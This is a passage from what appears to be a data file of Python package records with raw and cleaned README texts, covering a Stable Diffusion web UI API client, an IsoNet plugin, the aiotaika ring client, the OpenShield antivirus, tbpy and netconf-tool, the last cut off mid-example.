 'control_openpose-fp16 [9ca67cc5]',
 'control_scribble-fp16 [c508311e]',
 'control_seg-fp16 [b9c1cc12]']
 </pre>

**Use of ControlNetInterface txt2img/img2img is deprecated.** Please use the txt2img and img2img api with controlnet_units parameter.


```
# normal txt2img
r = api.txt2img(prompt=""photo of a beautiful girl with blonde hair"", height=512, seed=100)
img = r.image
img
```

```
# txt2img with ControlNet
unit1 = easyai.ControlNetUnit(input_image=img, module='canny', model='control_canny-fp16 [e3fe7712]')

r = api.txt2img(prompt=""photo of a beautiful girl"", controlnet_units=[unit1])
r.image
```

![cn2](https://user-images.githubusercontent.com/1288793/222315791-c6c480eb-2987-4044-b673-5f2cb6135f87.png)


```
# img2img with multiple ControlNets
unit1 = easyai.ControlNetUnit(input_image=img, module='canny', model='control_canny-fp16 [e3fe7712]')
unit2 = easyai.ControlNetUnit(input_image=img, module='depth', model='control_depth-fp16 [400750f6]', weight=0.5)

r2 = api.img2img(prompt=""girl"",
            images=[img],
            width=512,
            height=512,
            controlnet_units=[unit1, unit2],
            sampler_name=""Euler a"",
            cfg_scale=7,
           )
r2.image
```

```
r2.images[1]
```

```
r2.images[2]
```
","# easyai
API client for AUTOMATIC1111/stable-diffusion-webui

Supports txt2img, img2img, extra-single-image, extra-batch-images API calls.

API support have to be enabled from webui. Add --api when running webui.
It's explained [here](https://github.com/AUTOMATIC1111/stable-diffusion-webui/wiki/API).

You can use --api-auth user1:pass1,user2:pass2 option to enable authentication for api access.
(Since it's basic http authentication the password is transmitted in cleartext)

API calls are (almost) direct translation from http://127.0.0.1:7860/docs as of 2022/11/21.

# Install

```
pip install easyai
```

# Usage

easyai_demo.ipynb contains example code with original images. Images are compressed as jpeg in this document.

## create API client
```
import easyai

# create API client
api = easyai.EasyAPI()

# create API client with custom host, port
#api = easyai.EasyAPI(host='127.0.0.1', port=7860)

# create API client with custom host, port and https
#api = easyai.EasyAPI(host='webui.example.com', port=443, use_https=True)

# create API client with default sampler, steps.
#api = easyai.EasyAPI(sampler='Euler a', steps=20)

# optionally set username, password when --api-auth is set on webui.
api.set_auth('username', 'password')
```

## txt2img
```
result1 = api.txt2img(prompt=""cute squirrel"",
                    negative_prompt=""ugly, out of frame"",
                    seed=1003,
                    styles=[""anime""],
                    cfg_scale=7,
#                      sampler_index='DDIM',
#                      steps=30,
#                      enable_hr=True,
#                      hr_scale=2,
#                      hr_upscaler=easyai.HiResUpscaler.Latent,
#                      hr_second_pass_steps=20,
#                      hr_resize_x=1536,
#                      hr_resize_y=1024,
#                      denoising_strength=0.4,

                    )
# images contains the returned images (PIL images)
result1.images

# image is shorthand for images[0]
result1.image

# info contains text info about the api call
result1.info

# info contains paramteres of the api call
result1.parameters

result1.image
```


## img2img
```
result2 = api.img2img(images=[result1.image], prompt=""cute cat"", seed=5555, cfg_scale=6.5, denoising_strength=0.6)
result2.image
```

## img2img inpainting
```
from PIL import Image, ImageDraw

mask = Image.new('RGB', result2.image.size, color = 'black')
# mask = result2.image.copy()
draw = ImageDraw.Draw(mask)
draw.ellipse((210,150,310,250), fill='white')
draw.ellipse((80,120,160,120+80), fill='white')

mask
```

```
inpainting_result = api.img2img(images=[result2.image],
                                mask_image=mask,
                                inpainting_fill=1,
                                prompt=""cute cat"",
                                seed=104,
                                cfg_scale=5.0,
                                denoising_strength=0.7)
inpainting_result.image
```

## extra-single-image
```
result3 = api.extra_single_image(image=result2.image,
                                 upscaler_1=easyai.Upscaler.ESRGAN_4x,
                                 upscaling_resize=1.5)
print(result3.image.size)
result3.image
```
(768, 768)


## extra-batch-images
```
result4 = api.extra_batch_images(images=[result1.image, inpainting_result.image],
                                 upscaler_1=easyai.Upscaler.ESRGAN_4x,
                                 upscaling_resize=1.5)
result4.images[0]
```
```
result4.images[1]
```

### Scripts support
Scripts from AUTOMATIC1111's Web UI are supported, but there aren't official models that define a script's interface.

To find out the list of arguments that are accepted by a particular script look up the associated python file from
AUTOMATIC1111's repo `scripts/[script_name].py`. Search for its `run(p, **args)` function and the arguments that come
after 'p' is the list of accepted arguments

#### Example for X/Y/Z Plot script:
```
(scripts/xyz_grid.py file from AUTOMATIC1111's repo)

    def run(self, p, x_type, x_values, y_type, y_values, z_type, z_values, draw_legend, include_lone_images, include_sub_grids, no_fixed_seeds, margin_size):
    ...
```
List of accepted arguments:
* _x_type_: Index of the axis for X axis. Indexes start from [0: Nothing]
* _x_values_: String of comma-separated values for the X axis
* _y_type_: Index of the axis type for Y axis. As the X axis, indexes start from [0: Nothing]
* _y_values_: String of comma-separated values for the Y axis
* _z_type_: Index of the axis type for Z axis. As the X axis, indexes start from [0: Nothing]
* _z_values_: String of comma-separated values for the Z axis
* _draw_legend_: ""True"" or ""False"". IMPORTANT: It needs to be a string and not a Boolean value
* _include_lone_images_: ""True"" or ""False"". IMPORTANT: It needs to be a string and not a Boolean value
* _include_sub_grids_: ""True"" or ""False"". IMPORTANT: It needs to be a string and not a Boolean value
* _no_fixed_seeds_: ""True"" or ""False"". IMPORTANT: It needs to be a string and not a Boolean value
* margin_size: int value
```
# Available Axis options (Different for txt2img and img2img!)
XYZPlotAvailableTxt2ImgScripts = [
    ""Nothing"",
    ""Seed"",
    ""Var. seed"",
    ""Var. strength"",
    ""Steps"",
    ""Hires steps"",
    ""CFG Scale"",
    ""Prompt S/R"",
    ""Prompt order"",
    ""Sampler"",
    ""Checkpoint name"",
    ""Sigma Churn"",
    ""Sigma min"",
    ""Sigma max"",
    ""Sigma noise"",
    ""Eta"",
    ""Clip skip"",
    ""Denoising"",
    ""Hires upscaler"",
    ""VAE"",
    ""Styles"",
]

XYZPlotAvailableImg2ImgScripts = [
    ""Nothing"",
    ""Seed"",
    ""Var. seed"",
    ""Var. strength"",
    ""Steps"",
    ""CFG Scale"",
    ""Image CFG Scale"",
    ""Prompt S/R"",
    ""Prompt order"",
    ""Sampler"",
    ""Checkpoint name"",
    ""Sigma Churn"",
    ""Sigma min"",
    ""Sigma max"",
    ""Sigma noise"",
    ""Eta"",
    ""Clip skip"",
    ""Denoising"",
    ""Cond. Image Mask Weight"",
    ""VAE"",
    ""Styles"",
]

# Example call
XAxisType = ""Steps""
XAxisValues = ""20,30""
YAxisType = ""Sampler""
YAxisValues = ""Euler a, LMS""
ZAxisType = ""Nothing""
ZAxisValues = """"
drawLegend = ""True""
includeLoneImages = ""False""
includeSubGrids = ""False""
noFixedSeeds = ""False""
marginSize = 0


# x_type, x_values, y_type, y_values, z_type, z_values, draw_legend, include_lone_images, include_sub_grids, no_fixed_seeds, margin_size

result = api.txt2img(
                    prompt=""cute girl with short brown hair in black t-shirt in animation style"",
                    seed=1003,
                    script_name=""X/Y/Z Plot"",
                    script_args=[
                        XYZPlotAvailableTxt2ImgScripts.index(XAxisType),
                        XAxisValues,
                        XYZPlotAvailableTxt2ImgScripts.index(YAxisType),
                        YAxisValues,
                        XYZPlotAvailableTxt2ImgScripts.index(ZAxisType),
                        ZAxisValues,
                        drawLegend,
                        includeLoneImages,
                        includeSubGrids,
                        noFixedSeeds,
                        marginSize,                        ]
                    )

result.image
```


### Configuration APIs
```
# return map of current options
options = api.get_options()

# change sd model
options = {}
options['sd_model_checkpoint'] = 'model.ckpt [7460a6fa]'
api.set_options(options)

# when calling set_options, do not pass all options returned by get_options().
# it makes webui unusable (2022/11/21).

# get available sd models
api.get_sd_models()

# misc get apis
api.get_samplers()
api.get_cmd_flags()
api.get_hypernetworks()
api.get_face_restorers()
api.get_realesrgan_models()
api.get_prompt_styles()
api.get_artist_categories()
api.get_artists()
api.get_progress()
```

### Utility methods
```
# save current model name
old_model = api.util_get_current_model()

# get list of available models
models = api.util_get_model_names()

# set model (use exact name)
api.util_set_model(models[0])

# set model (find closest match)
api.util_set_model('robodiffusion')

# wait for job complete
api.util_wait_for_ready()

```

### LORA and alwayson_scripts example

```
r = api.txt2img(prompt='photo of a cute girl with green hair  shuimobysim __juice__',
                seed=1000,
                save_images=True,
                alwayson_scripts={""Simple wildcards"":[]} # wildcards extension doesn't accept more parameters.
               )
r.image
```

### Extension support - Model-Keyword
```
# https://github.com/mix1009/model-keyword
mki = easyai.ModelKeywordInterface(api)
mki.get_keywords()
```
ModelKeywordResult(keywords=['nousr robot'], model='robo-diffusion-v1.ckpt', oldhash='41fef4bd', match_source='model-keyword.txt')


### Extension support - Instruct-Pix2Pix
```
# Instruct-Pix2Pix extension is now deprecated and is now part of webui.
# You can use normal img2img with image_cfg_scale when instruct-pix2pix model is loaded.
r = api.img2img(prompt='sunset', images=[pil_img], cfg_scale=7.5, image_cfg_scale=1.5)
r.image
```

### Extension support - ControlNet
```
# https://github.com/Mikubill/sd-webui-controlnet
cn = easyai.ControlNetInterface(api)
cn.model_list()
```

['control_canny-fp16 [e3fe7712]',
 'control_depth-fp16 [400750f6]',
 'control_hed-fp16 [13fee50b]',
 'control_mlsd-fp16 [e3705cfa]',
 'control_normal-fp16 [63f96f7c]',
 'control_openpose-fp16 [9ca67cc5]',
 'control_scribble-fp16 [c508311e]',
 'control_seg-fp16 [b9c1cc12]']
 

**Use of ControlNetInterface txt2img/img2img is deprecated.** Please use the txt2img and img2img api with controlnet_units parameter.


```
# normal txt2img
r = api.txt2img(prompt=""photo of a beautiful girl with blonde hair"", height=512, seed=100)
img = r.image
img
```

```
# txt2img with ControlNet
unit1 = easyai.ControlNetUnit(input_image=img, module='canny', model='control_canny-fp16 [e3fe7712]')

r = api.txt2img(prompt=""photo of a beautiful girl"", controlnet_units=[unit1])
r.image
```

![cn2](https://user-images.githubusercontent.com/1288793/222315791-c6c480eb-2987-4044-b673-5f2cb6135f87.png)


```
# img2img with multiple ControlNets
unit1 = easyai.ControlNetUnit(input_image=img, module='canny', model='control_canny-fp16 [e3fe7712]')
unit2 = easyai.ControlNetUnit(input_image=img, module='depth', model='control_depth-fp16 [400750f6]', weight=0.5)

r2 = api.img2img(prompt=""girl"",
            images=[img],
            width=512,
            height=512,
            controlnet_units=[unit1, unit2],
            sampler_name=""Euler a"",
            cfg_scale=7,
           )
r2.image
```

```
r2.images[1]
```

```
r2.images[2]
```
",freemindcore/sdwebuiapi
scipion-em-isonet,https://github.com/scipion-em/scipion-em-isonet,0,1985,1794,"================
IsoNet plugin
================

This plugin allows to use IsoNet programs within the Scipion framework

`IsoNet <https://github.com/IsoNet-cryoET/IsoNet/>`_ stand for ISOtropic reconstruction of Electron Tomography.
It train deep neural networks to reconstruct meaningful contents in the missing wedge for electron tomography
increase signal-to-noise ratio using the information learned from the original tomogram. The software requires
tomograms as input. Observing at about 30A resolutions, the IsoNet generated tomograms are largely isotropic.


You will need to use `3.0.0 <https://scipion-em.github.io/docs/release-3.0.0/docs/scipion-modes/how-to-install.html>`_ version of Scipion to run these protocols.


Protocols
==========

* **Isotropic Reconstruction**: Isotropic Reconstruction of Electron Tomograms with Deep Learning

**Latest plugin version**
==========================
**v3.0.0**
-----------
* **new**     :  First plugin version


**Installing the plugin**
=========================

In order to install the plugin follow these instructions:

1. **Install the plugin**

.. code-block::

     scipion installp -p scipion-em-isonet

or through the **plugin manager** by launching Scipion and following **Configuration** >> **Plugins**

**To install in development mode**

- Clone or download the plugin repository

.. code-block::

          git clone https://github.com/scipion-em/scipion-em-isonet.git

- Install the plugin in developer mode.

.. code-block::

  scipion installp -p local/path/to/scipion-em-isonet --devel


===============
Buildbot status
===============

Status devel version:

.. image:: http://scipion-test.cnb.csic.es:9980/badges/isonet_devel.svg

Status production version:

.. image:: http://scipion-test.cnb.csic.es:9980/badges/isonet_prod.svg


==================
IsoNet References
==================
The publication associated with IsoNet can be found `here <https://www.biorxiv.org/content/10.1101/2021.07.17.452128v1>`_:","================
IsoNet plugin
================

This plugin allows to use IsoNet programs within the Scipion framework

`IsoNet `_ stand for ISOtropic reconstruction of Electron Tomography.
It train deep neural networks to reconstruct meaningful contents in the missing wedge for electron tomography
increase signal-to-noise ratio using the information learned from the original tomogram. The software requires
tomograms as input. Observing at about 30A resolutions, the IsoNet generated tomograms are largely isotropic.


You will need to use `3.0.0 `_ version of Scipion to run these protocols.


Protocols
==========

* **Isotropic Reconstruction**: Isotropic Reconstruction of Electron Tomograms with Deep Learning

**Latest plugin version**
==========================
**v3.0.0**
-----------
* **new**     :  First plugin version


**Installing the plugin**
=========================

In order to install the plugin follow these instructions:

1. **Install the plugin**

.. code-block::

     scipion installp -p scipion-em-isonet

or through the **plugin manager** by launching Scipion and following **Configuration** >> **Plugins**

**To install in development mode**

- Clone or download the plugin repository

.. code-block::

          git clone https://github.com/scipion-em/scipion-em-isonet.git

- Install the plugin in developer mode.

.. code-block::

  scipion installp -p local/path/to/scipion-em-isonet --devel


===============
Buildbot status
===============

Status devel version:

.. image:: http://scipion-test.cnb.csic.es:9980/badges/isonet_devel.svg

Status production version:

.. image:: http://scipion-test.cnb.csic.es:9980/badges/isonet_prod.svg


==================
IsoNet References
==================
The publication associated with IsoNet can be found `here `_:",scipion-em/scipion-em-isonet
aiotaika,https://github.com/Taika-Tech/aiotaika-python,11,3543,3543,"# aiotaika

[![Documentation Status](https://readthedocs.org/projects/aiotaika-python/badge/?version=stable)](https://aiotaika-python.readthedocs.io/en/stable/?badge=stable) [![Latest PyPI release](https://img.shields.io/pypi/v/aiotaika)](https://pypi.org/project/aiotaika/) ![Supported Python versions](https://img.shields.io/pypi/pyversions/aiotaika.svg)

## Taika asynchronous client library for Python

This library provides a very intuitive API for developers to easily create Python applications for Taika Tech's Spatial User Interface (SUI). With SUI, you can program actions to your physical environment, which are triggered based on location, orientation, and/or gesture data coming from a Taika Ring or Taika Tag.

You can find aiotaika's documentation from [Read the Docs](https://aiotaika-python.readthedocs.io/).

## Basic Examples

For more examples, see [examples](/examples) folder of the repository.

### Callback Example

In this example, we subscribe to move events and gesture events of ring ID 3.
In the callback function, we track the latest position and when a gesture event
happens, we print out which gesture was made with the latest location data.

With callbacks one can register one or more callbacks to a single callback function.
However, the Event type must be a parent class of all incoming event objects in that
callback function. Here `RingGestureEvent` and `RingMoveEvent` inherit from
`RingEvent`.

```
import asyncio

from aiotaika import TaikaClient
from aiotaika.events import EventType
from aiotaika.ring import RingGestureEvent, RingMoveEvent

Vector3 last_position

async def my_callback(event: RingEvent) -> None:
    if isinstance(event, RingMoveEvent):
        last_position = event.position
    elif isinstance(event, RingGestureEvent):
        print(f""{event.gesture} in position {last_position}"")


async def main() -> None:
    async with TaikaClient(
        host=""127.0.0.1"", username=""root"", password=""""
    ) as taika:
        rings = taika.rings
        for key, ring in rings.items():
            print(""{}: {}"".format(key, ring.metadata))
        await rings[3].register_event_cb(EventType.RING_MOVE_EVT, my_callback)
        await rings[3].register_event_cb(EventType.RING_GESTURE_EVT, my_callback)
        await asyncio.sleep(5)


try:
    asyncio.run(main())
except KeyboardInterrupt:
    pass
```

### Asynchronous Generator Example (no callbacks!)

This example shows simply how all the incoming events can be handled via the `events`
AsyncGenerator of the `TaikaClient` class. In this example, we simply print out a
ring's name and position when a `RingMoveEvent` happens.

```
import asyncio

from aiotaika import TaikaClient
from aiotaika.ring import RingMoveEvent

async def main() -> None:
    async with TaikaClient(
        host=""127.0.0.1"", username=""root"", password=""""
    ) as taika:
        async with taika.events() as events:
            async for event in events:
                if isinstance(event, RingMoveEvent):
                    print(f""Ring {event.metadata.name} position:"")
                    print(f""x: {event.position.x}, z: {event.position.z}"")
                    print(f""height: {event.position.y}"")


try:
    asyncio.run(main())
except KeyboardInterrupt:
    pass
```

## Requirements:

### Hardware

- Taika Development Kit

### Software

_Note: these should be automatically satisfied if `aiotaika` is installed via `pip`._

You can find precise version requirements from [pyproject.toml](/pyproject.toml)

- `Python`
- `asyncio-mqtt`
- `aiomysql`
","# aiotaika

[![Documentation Status](https://readthedocs.org/projects/aiotaika-python/badge/?version=stable)](https://aiotaika-python.readthedocs.io/en/stable/?badge=stable) [![Latest PyPI release](https://img.shields.io/pypi/v/aiotaika)](https://pypi.org/project/aiotaika/) ![Supported Python versions](https://img.shields.io/pypi/pyversions/aiotaika.svg)

## Taika asynchronous client library for Python

This library provides a very intuitive API for developers to easily create Python applications for Taika Tech's Spatial User Interface (SUI). With SUI, you can program actions to your physical environment, which are triggered based on location, orientation, and/or gesture data coming from a Taika Ring or Taika Tag.

You can find aiotaika's documentation from [Read the Docs](https://aiotaika-python.readthedocs.io/).

## Basic Examples

For more examples, see [examples](/examples) folder of the repository.

### Callback Example

In this example, we subscribe to move events and gesture events of ring ID 3.
In the callback function, we track the latest position and when a gesture event
happens, we print out which gesture was made with the latest location data.

With callbacks one can register one or more callbacks to a single callback function.
However, the Event type must be a parent class of all incoming event objects in that
callback function. Here `RingGestureEvent` and `RingMoveEvent` inherit from
`RingEvent`.

```
import asyncio

from aiotaika import TaikaClient
from aiotaika.events import EventType
from aiotaika.ring import RingGestureEvent, RingMoveEvent

Vector3 last_position

async def my_callback(event: RingEvent) -> None:
    if isinstance(event, RingMoveEvent):
        last_position = event.position
    elif isinstance(event, RingGestureEvent):
        print(f""{event.gesture} in position {last_position}"")


async def main() -> None:
    async with TaikaClient(
        host=""127.0.0.1"", username=""root"", password=""""
    ) as taika:
        rings = taika.rings
        for key, ring in rings.items():
            print(""{}: {}"".format(key, ring.metadata))
        await rings[3].register_event_cb(EventType.RING_MOVE_EVT, my_callback)
        await rings[3].register_event_cb(EventType.RING_GESTURE_EVT, my_callback)
        await asyncio.sleep(5)


try:
    asyncio.run(main())
except KeyboardInterrupt:
    pass
```

### Asynchronous Generator Example (no callbacks!)

This example shows simply how all the incoming events can be handled via the `events`
AsyncGenerator of the `TaikaClient` class. In this example, we simply print out a
ring's name and position when a `RingMoveEvent` happens.

```
import asyncio

from aiotaika import TaikaClient
from aiotaika.ring import RingMoveEvent

async def main() -> None:
    async with TaikaClient(
        host=""127.0.0.1"", username=""root"", password=""""
    ) as taika:
        async with taika.events() as events:
            async for event in events:
                if isinstance(event, RingMoveEvent):
                    print(f""Ring {event.metadata.name} position:"")
                    print(f""x: {event.position.x}, z: {event.position.z}"")
                    print(f""height: {event.position.y}"")


try:
    asyncio.run(main())
except KeyboardInterrupt:
    pass
```

## Requirements:

### Hardware

- Taika Development Kit

### Software

_Note: these should be automatically satisfied if `aiotaika` is installed via `pip`._

You can find precise version requirements from [pyproject.toml](/pyproject.toml)

- `Python`
- `asyncio-mqtt`
- `aiomysql`
",taika-tech/aiotaika-python
openshield,https://github.com/jaedsonpys/openshield,0,1019,1019,"# OpenShield

OpenShield is a simple and fast antivirus that allows you to scan various files to find malware on your computer. The database used to perform the malware search comes from [MalwareBazaar](https://bazaar.abuse.ch/export). The project is written in Python and open-source, it can be used via command-line interface (CLI).

## Getting started

Install the program using the PIP package manager or install it manually by cloning the repository:

```
pip install openshield
```
```
git clone https://github.com/jaedsonpys/openshield.git
cd openshield/
python3 setup.py install
```

## How to use

To scan files and/or directories, use the `openshield scan` command and pass as argument the name of the directory or file. Here is an example:

```
openshield scan ~/Downloads
```

Now scanning multiple files at once:

```
openshield scan script.py MyAplication.exe
```

You will receive a warning message if malware is found, the advice is to delete the file as soon as possible and **do not run or open** it.
","# OpenShield

OpenShield is a simple and fast antivirus that allows you to scan various files to find malware on your computer. The database used to perform the malware search comes from [MalwareBazaar](https://bazaar.abuse.ch/export). The project is written in Python and open-source, it can be used via command-line interface (CLI).

## Getting started

Install the program using the PIP package manager or install it manually by cloning the repository:

```
pip install openshield
```
```
git clone https://github.com/jaedsonpys/openshield.git
cd openshield/
python3 setup.py install
```

## How to use

To scan files and/or directories, use the `openshield scan` command and pass as argument the name of the directory or file. Here is an example:

```
openshield scan ~/Downloads
```

Now scanning multiple files at once:

```
openshield scan script.py MyAplication.exe
```

You will receive a warning message if malware is found, the advice is to delete the file as soon as possible and **do not run or open** it.
",jaedsonpys/openshield
recurrent-memory-transformer-pytorch,https://github.com/lucidrains/recurrent-memory-transformer-pytorch,2,0,0,,,lucidrains/recurrent-memory-transformer-pytorch
tbpy,https://github.com/Ellicode/terminalbreaker,0,238,211,"<div align=""center"">

![screen recording](screenrecord.gif)

## `pip install tbpy`

TerminalBreaker is a python module to create better guis, forms and more.

[Documentation](https://ellicode.github.io/terminalbreaker)

</div>
","

![screen recording](screenrecord.gif)

## `pip install tbpy`

TerminalBreaker is a python module to create better guis, forms and more.

[Documentation](https://ellicode.github.io/terminalbreaker)


",ellicode/terminalbreaker
netconf-tool,https://github.com/BSpendlove/netconf-tool,7,12694,9700,"# netconf-tool

This is a tool aimed for developer experience / making things faster when I am trying to test NETCONF related tasks without having to rewrite a random python script. I've found myself constantly writing little python scripts for NETCONF to test functionality or even grab data such as server capabilities, setup event based notifications/subscription to test something and have probably got 100 scripts that do the same thing in different folders through the various projects I've worked on.

Therefore I've created this tool to improve my developer experience working with NETCONF. At the ease of a quick command, I want to be able to get config, try out some edit-config functionality, grab capabilities of a new vendor I am working with, test NETCONF notifications etc... and now I can and want to share my progress as I work my way through adding functionality to this tool.

Here are the reasons for the required modules:

- ncclient                  - Obvious one... Handles the low networking level of SSH/NETCONF
- click and click-plugins   - Click is an awesome tool to build CLI applications, netconf-tool is a CLI application
- loguru                    - Best logging module out there, I don't like exit() and print() statements...
- redis                     - Used to test notification events against a redis pubsub environment
- pika                      - Used to test notification events against a rabbitmq environment
- xmltodict                 - Allow lazy conversion from XML to JSON for formatting arguments on some commands

This CLI application is built to load plugins using the entrypoint of netconf-tools so I may look into adding more functionality once I move over all my developer focused NETCONF tasks to this CLI project.

The plan in the future is to setup a better experience for contributers with pytest and a better pipeline however I will try my best not to break everything when I release a new version...

## Environment Variables

Use NETCONF_TOOL_USERNAME and NETCONF_TOOL_PASSWORD environment variables to prevent exposing the --username and --password arguments in your operating system CLI history.

## Feature Examples

### netconf-tool subscription local

This creates a notification event subscription (RFC 5277) and displays the NETCONF payload on the screen, currently doesn't support replay functionality but is useful when developing NETCONF based alerting NMS/applications.

```bash
$ netconf-tool subscription local --host 192.0.2.1
2023-04-28 22:12:14.299 | INFO     | netconf_tool.subscription.local:cli_subscription_local:18 - Attempting to establish NETCONF session to 192.0.2.1:830
2023-04-28 22:12:14.662 | SUCCESS  | netconf_tool.subscription.local:cli_subscription_local:28 - Established NETCONF connection to 192.0.2.1:830 (Session ID: 43)
2023-04-28 22:12:14.770 | SUCCESS  | netconf_tool.subscription.local:cli_subscription_local:32 - Created Netconf Subscription, you can exit out of here using Ctrl+C
2023-04-28 22:12:14.770 | INFO     | netconf_tool.subscription.local:cli_subscription_local:38 - Awaiting next NETCONF <notification/>
2023-04-28 22:12:23.035 | INFO     | netconf_tool.subscription.local:cli_subscription_local:41 - <?xml version=""1.0"" encoding=""UTF-8""?>
<notification xmlns=""urn:ietf:params:xml:ns:netconf:notification:1.0"">
  <eventTime>2023-04-28T22:12:22Z</eventTime>
  <netconf-config-change xmlns=""urn:ietf:params:xml:ns:yang:ietf-netconf-notifications"">
    <changed-by>
      <username>netconftool</username>
      <session-id>0</session-id>
    </changed-by>
    <datastore>running</datastore>
    <edit>
      <target
        xmlns:oc-if=""http://openconfig.net/yang/interfaces"">/oc-if:interfaces/oc-if:interface[name='xe16']/oc-if:config</target>
      <operation>merge</operation>
    </edit>
    <edit>
      <target
        xmlns:oc-netinst=""http://openconfig.net/yang/network-instance"">/oc-netinst:network-instances/oc-netinst:network-instance/oc-netinst:interfaces/oc-netinst:interface</target>
      <operation>merge</operation>
    </edit>
  </netconf-config-change>
</notification>
```

### netconf-tool subscription redis-pubsub

Similar to `netconf-tool subscription local` however sends the NETCONF notification/event to a Redis pubsub channel.

```bash
$ netconf-tool subscription redis-pubsub --host 192.0.2.1
2023-04-29 17:32:55.350 | INFO     | netconf_tool.subscription.redis:cli_subscription_redis_pubsub:35 - Checking if Redis server 127.0.0.1:6379 is available
2023-04-29 17:32:55.374 | SUCCESS  | netconf_tool.subscription.redis:cli_subscription_redis_pubsub:39 - Redis server is available...
2023-04-29 17:32:55.374 | INFO     | netconf_tool.subscription.redis:cli_subscription_redis_pubsub:44 - Attempting to establish NETCONF session to 192.0.2.1:830
2023-04-29 17:32:55.725 | SUCCESS  | netconf_tool.subscription.redis:cli_subscription_redis_pubsub:55 - Established NETCONF connection to 192.0.2.1:830 (Session ID: 117)
2023-04-29 17:32:55.832 | SUCCESS  | netconf_tool.subscription.redis:cli_subscription_redis_pubsub:59 - Created Netconf Subscription, you can exit out of here using Ctrl+C
2023-04-29 17:32:55.833 | INFO     | netconf_tool.subscription.redis:cli_subscription_redis_pubsub:65 - Awaiting next NETCONF <notification/>
```

Example using redis-cli
```
$ redis-cli
127.0.0.1:6379> subscribe netconf_tool:all_events
Reading messages... (press Ctrl-C to quit)
1) ""subscribe""
2) ""netconf_tool:all_events""
3) (integer) 1
1) ""message""
2) ""netconf_tool:all_events""
3) ""<?xml version=\""1.0\"" encoding=\""UTF-8\""?>\n<notification xmlns=\""urn:ietf:params:xml:ns:netconf:notification:1.0\"">\n  <eventTime>2023-04-29T15:24:39Z</eventTime>\n  <netconf-config-change xmlns=\""urn:ietf:params:xml:ns:yang:ietf-netconf-notifications\"">\n    <changed-by>\n      <username>netconftool</username>\n      <session-id>0</session-id>\n    </changed-by>\n    <datastore>running</datastore>\n    <edit>\n      <target\n        xmlns:oc-if=\""http://openconfig.net/yang/interfaces\"">/oc-if:interfaces/oc-if:interface[name='xe7']/oc-if:config</target>\n      <operation>merge</operation>\n    </edit>\n    <edit>\n      <target\n        xmlns:oc-netinst=\""http://openconfig.net/yang/network-instance\"">/oc-netinst:network-instances/oc-netinst:network-instance/oc-netinst:interfaces/oc-netinst:interface</target>\n      <operation>merge</operation>\n    </edit>\n  </netconf-config-change>\n</notification>""
1) ""message""
2) ""netconf_tool:all_events""
3) ""<?xml version=\""1.0\"" encoding=\""UTF-8\""?>\n<notification xmlns=\""urn:ietf:params:xml:ns:netconf:notification:1.0\"">\n  <eventTime>2023-04-29T15:24:39Z</eventTime>\n  <severity>critical</severity>\n  <eventClass>state</eventClass>\n  <interface-link-state-change-notification xmlns=\""http://www.ipinfusion.com/yang/ocnos/ipi-interface\"">\n    <name>xe7</name>\n    <oper-status>down</oper-status>\n  </interface-link-state-change-notification>\n</notification>""
```

### netconf-tool subscription rabbitmq

Similar to `netconf-tool subscription local` however sends the NETCONF notification/event to a RabbitMQ Queue.

```bash
$ netconf-tool subscription rabbitmq --host 192.0.2.1
2023-04-29 17:35:35.465 | INFO     | netconf_tool.subscription.rabbitmq:cli_subscription_rabbitmq:78 - Checking if RabbitMQ Server 127.0.0.1:5672 is available
2023-04-29 17:35:35.465 | INFO     | netconf_tool.subscription.rabbitmq:cli_subscription_rabbitmq:82 - Attempting to establish NETCONF session to 192.0.2.1:830
2023-04-29 17:35:35.831 | SUCCESS  | netconf_tool.subscription.rabbitmq:cli_subscription_rabbitmq:92 - Established NETCONF connection to 192.0.2.1:830 (Session ID: 118)
2023-04-29 17:35:35.938 | SUCCESS  | netconf_tool.subscription.rabbitmq:cli_subscription_rabbitmq:96 - Created Netconf Subscription, you can exit out of here using Ctrl+C
2023-04-29 17:35:35.938 | INFO     | netconf_tool.subscription.rabbitmq:cli_subscription_rabbitmq:102 - Awaiting next NETCONF <notification/>
```

### netconf-tool operations get-config

Simply prints out the returned data using the `get-config` NETCONF operation.

```bash
$ netconf-tool operations get-config --host 192.0.2.1
2023-04-29 17:28:48.547 | INFO     | netconf_tool.operations.get_config:cli_operations_get_config:43 - Attempting to establish NETCONF session to 192.0.2.1:830
2023-04-29 17:28:48.915 | SUCCESS  | netconf_tool.operations.get_config:cli_operations_get_config:53 - Established NETCONF connection to 192.0.2.1:830 (Session ID: 115)
<?xml version=""1.0"" ?><data xmlns=""urn:ietf:params:xml:ns:netconf:base:1.0"" xmlns:nc=""urn:ietf:params:xml:ns:netconf:base:1.0"">
<ommited>
```

### netconf-tool operations list-server-capabilities

Prints the server capabilities unless --export-json flag is used, if this flag is used then each capability will be parsed into an RFC3986 compliant object/dictionary and then exported into the relevant filename used in this argument.

```bash
$ netconf-tool operations list-server-capabilities --host 192.0.2.1
2023-04-29 17:27:59.209 | INFO     | netconf_tool.operations.capabilities:netconf_tool_cli_operations_list_server_capabilities:29 - Attempting to establish NETCONF session to 192.0.2.1:830
2023-04-29 17:27:59.566 | SUCCESS  | netconf_tool.operations.capabilities:netconf_tool_cli_operations_list_server_capabilities:39 - Established NETCONF connection to 192.0.2.1:830 (Session ID: 113)
urn:ietf:params:netconf:base:1.0
urn:ietf:params:netconf:base:1.1
urn:ietf:params:netconf:capability:candidate:1.0
urn:ietf:params:netconf:capability:confirmed-commit:1.0
urn:ietf:params:netconf:capability:confirmed-commit:1.1
urn:ietf:params:netconf:capability:rollback-on-error:1.0
urn:ietf:params:netconf:capability:startup:1.0
urn:ietf:params:netconf:capability:url:1.0?scheme=file,ftp,http
urn:ietf:params:netconf:capability:notification:1.0
urn:ietf:params:netconf:capability:interleave:1.0
urn:ietf:params:netconf:capability:with-defaults:1.0?basic-mode=explicit&also-supported=trim,report-all,report-all-tagged
```

### netconf-tool yangcli get-config

This command will attempt to lazily build the dynamic XML filter for a provided command in the traditional CLI style, it was inspired by yangcli however doesn't involve YANG at all for any validation, its simply a hack to build the filter if you have an idea of the XML format without having to wrap the text in XML tags. For example if you are trying to just pull the overload-bit configuration from ISIS using Openconfig, then format your CLI command like this:

`network-instances@http://openconfig.net/yang/network-instance network-instance protocols protocol isis global lsp-bit overload-bit config`

Use `@` to include XML Namespaces in your command structure. This simply sets the XML name of the element to` xmlns` and uses the value after the @.

```
netconf-tool yangcli get-config --host 192.0.2.1 ""network-instances@http://openconfig.net/yang/network-instance network-instance protocols protocol isis global lsp-bit overload-bit config""
